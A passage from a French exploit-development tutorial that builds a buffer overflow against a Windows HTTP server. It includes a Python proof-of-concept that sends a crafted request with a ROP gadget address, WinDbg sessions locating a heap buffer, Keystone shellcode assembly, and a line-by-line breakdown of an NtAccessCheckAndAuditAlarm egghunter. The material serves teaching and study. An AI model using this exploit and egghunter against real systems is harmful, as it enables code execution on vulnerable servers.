<li>Soit faire des suppositions base sur le type d'application</li>
</ul>
<p>On essaye de trouver un espace supplémentaire en ajoutant un <em>buffer</em> après la fin de la requête <code>HTTP</code> à travers la variable <code>shellcode</code> :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a><span class="ch">#!/usr/bin/python</span>
<a id="__codelineno-36-2" name="__codelineno-36-2" href="#__codelineno-36-2"></a><span class="kn">import</span><span class="w"> </span><span class="nn">socket</span>
<a id="__codelineno-36-3" name="__codelineno-36-3" href="#__codelineno-36-3"></a><span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
<a id="__codelineno-36-4" name="__codelineno-36-4" href="#__codelineno-36-4"></a><span class="kn">from</span><span class="w"> </span><span class="nn">struct</span><span class="w"> </span><span class="kn">import</span> <span class="n">pack</span>
<a id="__codelineno-36-5" name="__codelineno-36-5" href="#__codelineno-36-5"></a>
<a id="__codelineno-36-6" name="__codelineno-36-6" href="#__codelineno-36-6"></a><span class="k">try</span><span class="p">:</span>
<a id="__codelineno-36-7" name="__codelineno-36-7" href="#__codelineno-36-7"></a>  <span class="n">server</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
<a id="__codelineno-36-8" name="__codelineno-36-8" href="#__codelineno-36-8"></a>  <span class="n">port</span> <span class="o">=</span> <span class="mi">80</span>
<a id="__codelineno-36-9" name="__codelineno-36-9" href="#__codelineno-36-9"></a>  <span class="n">size</span> <span class="o">=</span> <span class="mi">253</span>
<a id="__codelineno-36-10" name="__codelineno-36-10" href="#__codelineno-36-10"></a>
<a id="__codelineno-36-11" name="__codelineno-36-11" href="#__codelineno-36-11"></a>  <span class="n">httpMethod</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x31\xC9\x85\xC9\x0F\x84\x11</span><span class="s2">&quot;</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&quot; /&quot;</span> <span class="c1"># XOR ECX ECX; TEST ECX ECX; JE 0x17</span>
<a id="__codelineno-36-12" name="__codelineno-36-12" href="#__codelineno-36-12"></a>  <span class="n">inputBuffer</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x41</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="n">size</span>
<a id="__codelineno-36-13" name="__codelineno-36-13" href="#__codelineno-36-13"></a>  <span class="n">inputBuffer</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s2">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="p">(</span><span class="mh">0x418674</span><span class="p">))</span> <span class="c1"># 0x00418674 : POP EAX ; RET</span>
<a id="__codelineno-36-14" name="__codelineno-36-14" href="#__codelineno-36-14"></a>  <span class="n">httpEndRequest</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\r\n\r\n</span><span class="s2">&quot;</span>
<a id="__codelineno-36-15" name="__codelineno-36-15" href="#__codelineno-36-15"></a>
<a id="__codelineno-36-16" name="__codelineno-36-16" href="#__codelineno-36-16"></a>  <span class="n">shellcode</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;w00tw00t&quot;</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x44</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="mi">400</span>
<a id="__codelineno-36-17" name="__codelineno-36-17" href="#__codelineno-36-17"></a>
<a id="__codelineno-36-18" name="__codelineno-36-18" href="#__codelineno-36-18"></a>  <span class="n">buf</span> <span class="o">=</span> <span class="n">httpMethod</span> <span class="o">+</span> <span class="n">inputBuffer</span> <span class="o">+</span>  <span class="n">httpEndRequest</span> <span class="o">+</span> <span class="n">shellcode</span>
</code></pre></div>
<p>Exécution de la preuve de concept et positionnement d'un point d'arrêt sur l'adresse où se trouve la série d'instructions <code>POP EAX;RET</code> :</p>
<ul>
<li>On trouve le <em>pattern</em> <code>w00tw00t</code> une seule fois en mémoire</li>
</ul>
<div class="highlight"><pre><span></span><code><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a><span class="n">0</span><span class="p">:</span><span class="n">009</span><span class="p">&gt;</span> <span class="n">bp</span> <span class="n">0x00418674</span>
<a id="__codelineno-37-2" name="__codelineno-37-2" href="#__codelineno-37-2"></a><span class="c">#</span>
<a id="__codelineno-37-3" name="__codelineno-37-3" href="#__codelineno-37-3"></a><span class="n">0</span><span class="p">:</span><span class="n">009</span><span class="p">&gt;</span> <span class="n">g</span>
<a id="__codelineno-37-4" name="__codelineno-37-4" href="#__codelineno-37-4"></a><span class="n">Breakpoint</span> <span class="n">0</span> <span class="n">hit</span>
<a id="__codelineno-37-5" name="__codelineno-37-5" href="#__codelineno-37-5"></a><span class="p">[...]</span>
<a id="__codelineno-37-6" name="__codelineno-37-6" href="#__codelineno-37-6"></a><span class="n">00418674</span> <span class="n">58</span>              <span class="n">pop</span>     <span class="n">eax</span>
<a id="__codelineno-37-7" name="__codelineno-37-7" href="#__codelineno-37-7"></a><span class="n">0</span><span class="p">:</span><span class="n">004</span><span class="p">&gt;</span> <span class="n">s</span> <span class="n">-a</span> <span class="n">0x0</span> <span class="n">L</span><span class="k">?</span><span class="n">80000000</span> <span class="n">w00tw00t</span>
<a id="__codelineno-37-8" name="__codelineno-37-8" href="#__codelineno-37-8"></a><span class="n">01965aa6</span>  <span class="n">77</span> <span class="n">30</span> <span class="n">30</span> <span class="n">74</span> <span class="n">77</span> <span class="n">30</span> <span class="n">30</span> <span class="n">74</span><span class="p">-</span><span class="n">44</span> <span class="n">44</span> <span class="n">44</span> <span class="n">44</span> <span class="n">44</span> <span class="n">44</span> <span class="n">44</span> <span class="n">44</span>  <span class="n">w00tw00tDDDDDDDD</span>
<a id="__codelineno-37-9" name="__codelineno-37-9" href="#__codelineno-37-9"></a><span class="c">#</span>
<a id="__codelineno-37-10" name="__codelineno-37-10" href="#__codelineno-37-10"></a><span class="n">0</span><span class="p">:</span><span class="n">004</span><span class="p">&gt;</span> <span class="n">db</span> <span class="n">01965aa6</span> <span class="p">+</span> <span class="n">0n408</span> <span class="p">-</span> <span class="n">4</span> <span class="n">L4</span>
<a id="__codelineno-37-11" name="__codelineno-37-11" href="#__codelineno-37-11"></a><span class="n">01965c3a</span>  <span class="n">44</span> <span class="n">44</span> <span class="n">44</span> <span class="n">44</span>                                      <span class="n">DDDD</span>
</code></pre></div>
<p>On a donc identifié avec succès un second <em>buffer</em> on l'on va pouvoir stocker notre shellcode final.</p>
<h4 id="gestionnaire-de-tas-windows">Gestionnaire de Tas Windows</h4>
<p>On a trouve notre pattern a l'adresse mémoire <code>01965aa6</code>. Cependant, si on affiche la pile via <code>!teb</code> on se rend compte que l'adresse n'est pas dans la pile. On utilise la commande <code>!address</code> pour obtenir des informations sur l'adresse fournie en paramètre. L'adresse est présente sur la <code>heap</code> (tas) :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a><span class="c">#</span>
<a id="__codelineno-38-2" name="__codelineno-38-2" href="#__codelineno-38-2"></a><span class="n">0</span><span class="p">:</span><span class="n">004</span><span class="p">&gt;</span> <span class="n">s</span> <span class="n">-a</span> <span class="n">0x0</span> <span class="n">L</span><span class="k">?</span><span class="n">80000000</span> <span class="n">w00tw00t</span>
<a id="__codelineno-38-3" name="__codelineno-38-3" href="#__codelineno-38-3"></a><span class="n">01965aa6</span>  <span class="n">77</span> <span class="n">30</span> <span class="n">30</span> <span class="n">74</span> <span class="n">77</span> <span class="n">30</span> <span class="n">30</span> <span class="n">74</span><span class="p">-</span><span class="n">44</span> <span class="n">44</span> <span class="n">44</span> <span class="n">44</span> <span class="n">44</span> <span class="n">44</span> <span class="n">44</span> <span class="n">44</span>  <span class="n">w00tw00tDDDDDDDD</span>
<a id="__codelineno-38-4" name="__codelineno-38-4" href="#__codelineno-38-4"></a><span class="c">#</span>
<a id="__codelineno-38-5" name="__codelineno-38-5" href="#__codelineno-38-5"></a><span class="n">0</span><span class="p">:</span><span class="n">004</span><span class="p">&gt;</span> <span class="p">!</span><span class="n">teb</span>
<a id="__codelineno-38-6" name="__codelineno-38-6" href="#__codelineno-38-6"></a><span class="n">TEB</span> <span class="n">at</span> <span class="n">00385000</span>
<a id="__codelineno-38-7" name="__codelineno-38-7" href="#__codelineno-38-7"></a>    <span class="n">ExceptionList</span><span class="p">:</span>        <span class="n">046cff70</span>
<a id="__codelineno-38-8" name="__codelineno-38-8" href="#__codelineno-38-8"></a>    <span class="n">StackBase</span><span class="p">:</span>            <span class="n">046d0000</span>
<a id="__codelineno-38-9" name="__codelineno-38-9" href="#__codelineno-38-9"></a>    <span class="n">StackLimit</span><span class="p">:</span>           <span class="n">046cc000</span>
<a id="__codelineno-38-10" name="__codelineno-38-10" href="#__codelineno-38-10"></a><span class="p">[...]</span>
<a id="__codelineno-38-11" name="__codelineno-38-11" href="#__codelineno-38-11"></a><span class="n">0</span><span class="p">:</span><span class="n">004</span><span class="p">&gt;</span> <span class="p">!</span><span class="n">address</span> <span class="n">01965aa6</span>                 
<a id="__codelineno-38-12" name="__codelineno-38-12" href="#__codelineno-38-12"></a><span class="p">[...]</span>
<a id="__codelineno-38-13" name="__codelineno-38-13" href="#__codelineno-38-13"></a><span class="n">Usage</span><span class="p">:</span>                  <span class="n">Heap</span>
<a id="__codelineno-38-14" name="__codelineno-38-14" href="#__codelineno-38-14"></a><span class="n">Base</span> <span class="n">Address</span><span class="p">:</span>           <span class="n">01960000</span>
<a id="__codelineno-38-15" name="__codelineno-38-15" href="#__codelineno-38-15"></a><span class="k">End</span> <span class="n">Address</span><span class="p">:</span>            <span class="n">0196f000</span>
<a id="__codelineno-38-16" name="__codelineno-38-16" href="#__codelineno-38-16"></a><span class="p">[...]</span>
</code></pre></div>
<p>Le <em>Windows Heap Memory Manager</em> est une couche logicielle qui se situe au-dessus des interfaces de la mémoire virtuelle fournies par Windows. Cet outil permet aux applications de demander et relâcher dynamiquement de la mémoire à travers un panel d'API Windows (<code>VirtualAllocEx</code> <code>VirtualFreeEx</code> - <code>HeapAlloc</code> -  <code>HeapFree</code>).</p>
<p>Dans Windows, quand un nouveau processus se lance, le <code>Heap Manager</code> va automatiquement créer une nouvelle <code>heap</code> appellee <em>default process heap</em>. À haut niveau, les <code>heap</code> sont de gros morceaux de mémoire qui sont divisés en petit morceau pour répondre aux demandes dynamiques d'allocation mémoire.</p>
<p>Certain processus n'utilisent que le <em>default process heap</em> mais la plupart vont en créer de nouveaux avec l'API <code>HeapCreate</code> ou <code>ntdll!RtlCreateHeap</code> pour isoler des composants s'exécutant dans un même processus. Certains processus utilise <em>C Runtime Heap</em> pour la plupart de leurs allocations dynamiques (<code>malloc</code> - <code>free</code>). Ces fonctions vont à terme utiliser les fonctions du <em>Heap Manager</em> de NTDLL qui fait le lien avec le noyau Windows (<em>Windows Virtual Memory Manager</em>).</p>
<p>Du fait que notre buffer est stocké dans une mémoire dynamique, il n'est pas possible de déterminer sa localisation en avance. D'autres techniques doivent être utilisées pour trouver notre buffer.</p>
<h3 id="lapproche-egg-hunter">L'approche Egg Hunter</h3>
<p>Quand on doit trouver l'adresse mémoire d'un autre <em>buffer</em> sous notre contrôle dont l'adresse n'est pas statique on utilise des <em>egghunter</em>.</p>
<h4 id="keystone-engine">Keystone Engine</h4>
<p>Écrire du shellcode est simplifie avec l'utilisation d'outil tel que <em>Keystone Engine</em> qui est un framework assembleur. Il fait le lien avec différent langage de programmation tel que Python. On peut l'utiliser pour écrire de l'assembleur directement dans le code Python.</p>
<p>Exemple de code Python contenant du code assembleur :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a><span class="c1"># Import de tous les éléments de la librairie</span>
<a id="__codelineno-39-2" name="__codelineno-39-2" href="#__codelineno-39-2"></a><span class="kn">from</span><span class="w"> </span><span class="nn">keystone</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
<a id="__codelineno-39-3" name="__codelineno-39-3" href="#__codelineno-39-3"></a>
<a id="__codelineno-39-4" name="__codelineno-39-4" href="#__codelineno-39-4"></a><span class="c1"># Déclaration de la variable `CODE` qui contient du code assembleur</span>
<a id="__codelineno-39-5" name="__codelineno-39-5" href="#__codelineno-39-5"></a><span class="n">CODE</span> <span class="o">=</span> <span class="p">(</span>
<a id="__codelineno-39-6" name="__codelineno-39-6" href="#__codelineno-39-6"></a><span class="s2">&quot;                       &quot;</span>
<a id="__codelineno-39-7" name="__codelineno-39-7" href="#__codelineno-39-7"></a><span class="s2">&quot; start:                &quot;</span>
<a id="__codelineno-39-8" name="__codelineno-39-8" href="#__codelineno-39-8"></a><span class="s2">&quot;       xor eax, eax   ;&quot;</span>
<a id="__codelineno-39-9" name="__codelineno-39-9" href="#__codelineno-39-9"></a><span class="s2">&quot;       add eax, ecx   ;&quot;</span>
<a id="__codelineno-39-10" name="__codelineno-39-10" href="#__codelineno-39-10"></a><span class="s2">&quot;       push eax       ;&quot;</span>
<a id="__codelineno-39-11" name="__codelineno-39-11" href="#__codelineno-39-11"></a><span class="s2">&quot;       pop esi        ;&quot;</span>
<a id="__codelineno-39-12" name="__codelineno-39-12" href="#__codelineno-39-12"></a><span class="p">)</span>
<a id="__codelineno-39-13" name="__codelineno-39-13" href="#__codelineno-39-13"></a>
<a id="__codelineno-39-14" name="__codelineno-39-14" href="#__codelineno-39-14"></a><span class="c1"># Initialisation du `Keystone Engine` qui prend deux paramètres : l&#39;architecture et le mode</span>
<a id="__codelineno-39-15" name="__codelineno-39-15" href="#__codelineno-39-15"></a><span class="n">ks</span> <span class="o">=</span> <span class="n">Ks</span><span class="p">(</span><span class="n">KS_ARCH_X86</span><span class="p">,</span> <span class="n">KS_MODE_32</span><span class="p">)</span>
<a id="__codelineno-39-16" name="__codelineno-39-16" href="#__codelineno-39-16"></a>
<a id="__codelineno-39-17" name="__codelineno-39-17" href="#__codelineno-39-17"></a><span class="c1"># Compilation des instructions assembleur</span>
<a id="__codelineno-39-18" name="__codelineno-39-18" href="#__codelineno-39-18"></a><span class="c1"># La fonction `asm` renvoie une liste de byte encodes et le nombre d&#39;instructions compilées</span>
<a id="__codelineno-39-19" name="__codelineno-39-19" href="#__codelineno-39-19"></a><span class="n">encoding</span><span class="p">,</span> <span class="n">count</span> <span class="o">=</span> <span class="n">ks</span><span class="o">.</span><span class="n">asm</span><span class="p">(</span><span class="n">CODE</span><span class="p">)</span>
<a id="__codelineno-39-20" name="__codelineno-39-20" href="#__codelineno-39-20"></a>
<a id="__codelineno-39-21" name="__codelineno-39-21" href="#__codelineno-39-21"></a><span class="n">instructions</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
<a id="__codelineno-39-22" name="__codelineno-39-22" href="#__codelineno-39-22"></a>
<a id="__codelineno-39-23" name="__codelineno-39-23" href="#__codelineno-39-23"></a><span class="c1"># Itération sur les bytes</span>
<a id="__codelineno-39-24" name="__codelineno-39-24" href="#__codelineno-39-24"></a><span class="k">for</span> <span class="n">dec</span> <span class="ow">in</span> <span class="n">encoding</span><span class="p">:</span>
<a id="__codelineno-39-25" name="__codelineno-39-25" href="#__codelineno-39-25"></a>    <span class="c1"># Stockage au format python shellcode</span>
<a id="__codelineno-39-26" name="__codelineno-39-26" href="#__codelineno-39-26"></a>    <span class="n">instructions</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\\</span><span class="s2">x</span><span class="si">{0:02x}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">dec</span><span class="p">))</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
<a id="__codelineno-39-27" name="__codelineno-39-27" href="#__codelineno-39-27"></a>
<a id="__codelineno-39-28" name="__codelineno-39-28" href="#__codelineno-39-28"></a><span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Opcodes = (</span><span class="se">\&quot;</span><span class="s2">&quot;</span> <span class="o">+</span> <span class="n">instructions</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">)&quot;</span><span class="p">)</span>
</code></pre></div>
<p>Résultat à l'exécution :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a><span class="err">$</span> <span class="n">python</span> <span class="n">keystone</span><span class="o">-</span><span class="n">poc</span><span class="o">.</span><span class="n">py</span>                      
<a id="__codelineno-40-2" name="__codelineno-40-2" href="#__codelineno-40-2"></a><span class="n">Opcodes</span> <span class="o">=</span> <span class="p">(</span><span class="s2">&quot;</span><span class="se">\x31\xc0\x01\xc8\x50\x5e</span><span class="s2">&quot;</span><span class="p">)</span>
</code></pre></div>
<p>On vérifie que les <em>opcodes</em> correspondent a ceux générés via <code>msf-nasm_shell</code> :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a><span class="p">$</span> <span class="n">msf-nasm_shell</span>
<a id="__codelineno-41-2" name="__codelineno-41-2" href="#__codelineno-41-2"></a><span class="n">nasm</span> <span class="p">&gt;</span> <span class="n">xor</span> <span class="n">eax</span><span class="p">,</span><span class="n">eax</span>
<a id="__codelineno-41-3" name="__codelineno-41-3" href="#__codelineno-41-3"></a><span class="n">00000000</span>  <span class="n">31C0</span>              <span class="n">xor</span> <span class="n">eax</span><span class="p">,</span><span class="n">eax</span>
<a id="__codelineno-41-4" name="__codelineno-41-4" href="#__codelineno-41-4"></a><span class="n">nasm</span> <span class="p">&gt;</span> <span class="n">add</span> <span class="n">eax</span><span class="p">,</span><span class="n">ecx</span>
<a id="__codelineno-41-5" name="__codelineno-41-5" href="#__codelineno-41-5"></a><span class="n">00000000</span>  <span class="n">01C8</span>              <span class="n">add</span> <span class="n">eax</span><span class="p">,</span><span class="n">ecx</span>
<a id="__codelineno-41-6" name="__codelineno-41-6" href="#__codelineno-41-6"></a><span class="n">nasm</span> <span class="p">&gt;</span> <span class="n">push</span> <span class="n">eax</span>
<a id="__codelineno-41-7" name="__codelineno-41-7" href="#__codelineno-41-7"></a><span class="n">00000000</span>  <span class="n">50</span>                <span class="n">push</span> <span class="n">eax</span>
<a id="__codelineno-41-8" name="__codelineno-41-8" href="#__codelineno-41-8"></a><span class="n">nasm</span> <span class="p">&gt;</span> <span class="n">pop</span> <span class="n">esi</span>
<a id="__codelineno-41-9" name="__codelineno-41-9" href="#__codelineno-41-9"></a><span class="n">00000000</span>  <span class="n">5E</span>                <span class="n">pop</span> <span class="n">esi</span>
</code></pre></div>
<h4 id="egghunters-et-appels-systeme">Egghunters et appels système</h4>
<p>Un <em>egghunter</em> est un petit payload <em>first-stage</em> qui peut chercher dans le <em>Virtual Address Space</em> (VAS) du processus à la recherche du <em>egg</em>. Il va globalement chercher dans tout l'espace mémoire du programme cible.</p>
<p>Un des problèmes majeurs est qu'il n'est pas possible de savoir à l'avance si un espace mémoire est mappe ou pas - si on a les accès pour y accéder - quel type d'accès est autorisé sur cette espace mémoire. Dans de nombreux cas, on risque de déclencher un <em>access violation</em>.</p>
<p>L'auteur original de la <a href="http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf">première preuve de concept</a> a utilisé l'appel système <code>NtAccessCheckAndAuditAlarm</code> (numero <code>0x2</code>).</p>
<p>Un appel système (<em>system call</em>) est une interface entre espace utilisateur et espace noyau. Généralement, appelle à travers une instruction ASM dédiée (interupt / trap). Quand un appel système est appelé :</p>
<ul>
<li>Le programme courant va le signaler au système d'exploitation et demander à ce que l'opération soit réalisée</li>
<li>Le système d'exploitation prend en charge l'opération en background</li>
<li>Le système d'exploitation redonne la main au logiciel avec le résultat de l'opération</li>
</ul>
<p>Le <em>egghunter</em> va profiter de ce fonctionnement. Plutôt que de parcourir la mémoire au sein du programme et de risquer un <em>access violation</em> on utilise un appel système afin de laisser le système d'exploitation accéder aux adresses mémoires. Avant que la fonction soit appelée, le système d'exploitation va copier les arguments fournis dans l'espace utilisateur vers l'espace noyau.</p>
<p>Si l'adresse mémoire n'est pas mappée ou qu'on ne possède pas les bons accès, l'opération de copie va soulever un <em>access violation</em>. Le <em>access violation</em> va être géré dans le background et renvoyer un code <code>STATUS_ACCESS_VIOLATION</code> (<code>0xc0000005</code>), permettant au <em>egghunter</em> de continuer à la prochaine page mémoire.</p>
<p>Afin d'appeler un appel système, le système d'exploitation doit connaitre la fonction à appeler et les arguments a passer :</p>
<ul>
<li>Dans architecture <code>x86</code> la fonction est spécifiée via un numéro d'appel système unique (<em>System Call Number</em>) qui est positionné au sein du registre <code>EAX</code></li>
<li>Depot des arguments sur la pile si la fonction prend des paramètres</li>
<li>Copie du pointeur de pile <code>ESP</code> dans le registre <code>EDX</code> qui est passé en paramètre à l'appel système</li>
</ul>
<p>Durant l'appel système, l'OS va tenter d'accéder à l'adresse mémoire ou les arguments de la fonction sont stockés pour les copier de l'espace utilisateur à l'espace noyau. Si le registre <code>EDX</code> pointe sur une adresse mémoire non mappée ou à laquelle on a pas accès à cause d'un manque de permission le système d'exploitation va déclencher un <em>access violation</em>. L' <em>access violation</em> va être géré pour nous et renvoyer <code>STATUS_ACCESS_VIOLATION</code> dans <code>EAX</code>.</p>
<p>En appelant l'appel système <code>NtAccessCheckAndAuditAlarm</code> on va obtenir seulement deux résultats possibles :</p>
<ul>
<li>Si l'adresse est valide et qu'on a accès : <code>STATUS_NO_IMPERSONATION_TOKEN</code></li>
<li>Si l'adresse est non mappée ou qu'on a a pas accès : <code>STATUS_ACCESS_VIOLATION</code></li>
</ul>
<p>Analyse en détail du code assembleur de la preuve de concept original de <em>egghunter</em> :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a><span class="c1">#</span>
<a id="__codelineno-42-2" name="__codelineno-42-2" href="#__codelineno-42-2"></a><span class="c1">#</span>
<a id="__codelineno-42-3" name="__codelineno-42-3" href="#__codelineno-42-3"></a><span class="s2">&quot; loop_inc_page:    &quot;</span>
<a id="__codelineno-42-4" name="__codelineno-42-4" href="#__codelineno-42-4"></a>  <span class="c1"># Operation `OR` sur le registre `DX` (`EDX`)</span>
<a id="__codelineno-42-5" name="__codelineno-42-5" href="#__codelineno-42-5"></a>  <span class="c1"># Va faire pointer `EDX` sur la dernière adresse de la page mémoire</span>
<a id="__codelineno-42-6" name="__codelineno-42-6" href="#__codelineno-42-6"></a><span class="s2">&quot;  or dx, 0x0fff  ;&quot;</span> 
<a id="__codelineno-42-7" name="__codelineno-42-7" href="#__codelineno-42-7"></a><span class="c1">#</span>
<a id="__codelineno-42-8" name="__codelineno-42-8" href="#__codelineno-42-8"></a><span class="c1">#</span>
<a id="__codelineno-42-9" name="__codelineno-42-9" href="#__codelineno-42-9"></a><span class="s2">&quot; loop_inc_one:    &quot;</span>
<a id="__codelineno-42-10" name="__codelineno-42-10" href="#__codelineno-42-10"></a>  <span class="c1"># Operation `INC` sur le registre `EDX`</span>
<a id="__codelineno-42-11" name="__codelineno-42-11" href="#__codelineno-42-11"></a>  <span class="c1"># Incrémenter `EDX` de `1` pour pointer sur une nouvelle page mémoire</span>
<a id="__codelineno-42-12" name="__codelineno-42-12" href="#__codelineno-42-12"></a><span class="s2">&quot;  inc edx    ;&quot;</span>
</code></pre></div>
<p>Le registre <code>EDX</code> contient maintenant l'adresse de la prochaine page mémoire.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a><span class="c1">#</span>
<a id="__codelineno-43-2" name="__codelineno-43-2" href="#__codelineno-43-2"></a><span class="c1">#</span>
<a id="__codelineno-43-3" name="__codelineno-43-3" href="#__codelineno-43-3"></a><span class="s2">&quot; loop_check:     &quot;</span>
<a id="__codelineno-43-4" name="__codelineno-43-4" href="#__codelineno-43-4"></a>  <span class="c1"># On positionne le contenu du registre `EDX` sur la pile</span>
<a id="__codelineno-43-5" name="__codelineno-43-5" href="#__codelineno-43-5"></a>  <span class="c1"># Non nécessaire, mais permet d&#39;assurer une sauvegarde, car on ne peut pas garantir que EDX sera restauré a la suite de l&#39;appel système</span>
<a id="__codelineno-43-6" name="__codelineno-43-6" href="#__codelineno-43-6"></a><span class="s2">&quot;  push edx   ;&quot;</span>
<a id="__codelineno-43-7" name="__codelineno-43-7" href="#__codelineno-43-7"></a>  <span class="c1"># On positionne `0x2` sur la pile. 0x2 est le numéro de l&#39;appel système NtAccessCheckAndAuditAlarm</span>
<a id="__codelineno-43-8" name="__codelineno-43-8" href="#__codelineno-43-8"></a><span class="s2">&quot;  push 0x2    ;&quot;</span> 
<a id="__codelineno-43-9" name="__codelineno-43-9" href="#__codelineno-43-9"></a>  <span class="c1"># On positionne le dernier élément de la pile (`pop`) qui est donc `0x2` qu&#39;on vient de mettre dans la pile dans le registre `EAX`</span>
<a id="__codelineno-43-10" name="__codelineno-43-10" href="#__codelineno-43-10"></a>  <span class="c1"># Le numéro de l&#39;appel système est dans `EAX`</span>
<a id="__codelineno-43-11" name="__codelineno-43-11" href="#__codelineno-43-11"></a><span class="s2">&quot;  pop eax    ;&quot;</span> 
<a id="__codelineno-43-12" name="__codelineno-43-12" href="#__codelineno-43-12"></a>  <span class="c1"># Le numéro de l&#39;appel système est dans `EAX` et `EDX` contient un faux pointeur</span>
<a id="__codelineno-43-13" name="__codelineno-43-13" href="#__codelineno-43-13"></a>  <span class="c1"># On invoque l&#39;appel système va `INT`</span>
<a id="__codelineno-43-14" name="__codelineno-43-14" href="#__codelineno-43-14"></a><span class="s2">&quot;  int 0x2e   ;&quot;</span> 
</code></pre></div>
<p>Le système d'exploitation va invoquer l'appel système. Durant cet appel il va vérifier l'adresse mémoire stockée dans <code>EDX</code> pour récupérer les arguments de la fonction. Si l'accès a cette adresse stockée dans <code>EDX</code> entraine un <em>access violation</em> on obtiendra le statut <code>STATUS_ACCESS_VIOLATION</code> (<code>0xc0000005</code>) dans <code>EAX</code>.</p>
<p>Le prochain morceau de code va analyser le retour de l'appel système :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a>  <span class="c1"># On compare `AL` (registre du bas de `EAX`) avec `05` pour éviter le *null bytes*</span>
<a id="__codelineno-44-2" name="__codelineno-44-2" href="#__codelineno-44-2"></a><span class="s2">&quot;  cmp al,05   ;&quot;</span> 
<a id="__codelineno-44-3" name="__codelineno-44-3" href="#__codelineno-44-3"></a>  <span class="c1"># On restaure l&#39;adresse mémoire depuis la pile dans `EDX`</span>
<a id="__codelineno-44-4" name="__codelineno-44-4" href="#__codelineno-44-4"></a><span class="s2">&quot;  pop edx    ;&quot;</span> 
<a id="__codelineno-44-5" name="__codelineno-44-5" href="#__codelineno-44-5"></a><span class="c1">#</span>
<a id="__codelineno-44-6" name="__codelineno-44-6" href="#__codelineno-44-6"></a><span class="c1">#</span>
<a id="__codelineno-44-7" name="__codelineno-44-7" href="#__codelineno-44-7"></a><span class="s2">&quot; loop_check_valid:   &quot;</span>
<a id="__codelineno-44-8" name="__codelineno-44-8" href="#__codelineno-44-8"></a>  <span class="c1"># Jump conditionnel qui va se baser sur le résultat de l&#39;opération `CMP`</span>
<a id="__codelineno-44-9" name="__codelineno-44-9" href="#__codelineno-44-9"></a>    <span class="c1"># Si un `STATUS_ACCESS_VIOLATION` a été trouvé, on se déplace à la prochaine page mémoire en faisant un jump vers le début de notre script pour refaire les étapes précédentes</span>
<a id="__codelineno-44-10" name="__codelineno-44-10" href="#__codelineno-44-10"></a>    <span class="c1"># Si la mémoire est mappée ou qu&#39;on a accès on continue pour aller vérifier notre signature unique (*egg*)</span>
<a id="__codelineno-44-11" name="__codelineno-44-11" href="#__codelineno-44-11"></a><span class="s2">&quot;  je loop_inc_page ;&quot;</span>
</code></pre></div>
<p>On arrive ici si la mémoire est mappée ou qu'on a accès à la recherche de notre <em>egg</em> :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a><span class="c1">#</span>
<a id="__codelineno-45-2" name="__codelineno-45-2" href="#__codelineno-45-2"></a><span class="c1">#</span>
<a id="__codelineno-45-3" name="__codelineno-45-3" href="#__codelineno-45-3"></a><span class="s2">&quot; is_egg:      &quot;</span>
<a id="__codelineno-45-4" name="__codelineno-45-4" href="#__codelineno-45-4"></a>  <span class="c1"># On place note *egg* (ici `w00t` mais ça pourrait être autre chose) dans le registre `EAX`</span>
<a id="__codelineno-45-5" name="__codelineno-45-5" href="#__codelineno-45-5"></a><span class="s2">&quot;  mov eax, 0x74303077 ;&quot;</span> 
<a id="__codelineno-45-6" name="__codelineno-45-6" href="#__codelineno-45-6"></a>  <span class="c1"># On copie l&#39;adresse présente dans `EDX` dans `EDI`</span>
<a id="__codelineno-45-7" name="__codelineno-45-7" href="#__codelineno-45-7"></a><span class="s2">&quot;  mov edi, edx  ;&quot;</span> 
<a id="__codelineno-45-8" name="__codelineno-45-8" href="#__codelineno-45-8"></a>  <span class="c1"># Compare la valeur stockée dans `EAX` avec le 1er DWORD de l&#39;adresse mémoire sur laquelle pointe `EDI` (qui contient maintenant l&#39;adresse stockée dans `EDX` à laquelle l&#39;appel système a pu accéder)</span>
<a id="__codelineno-45-9" name="__codelineno-45-9" href="#__codelineno-45-9"></a>  <span class="c1"># On vérifie ainsi si l&#39;adresse mappée identifiée via l&#39;appel système contient l&#39;*egg* ou pas</span>
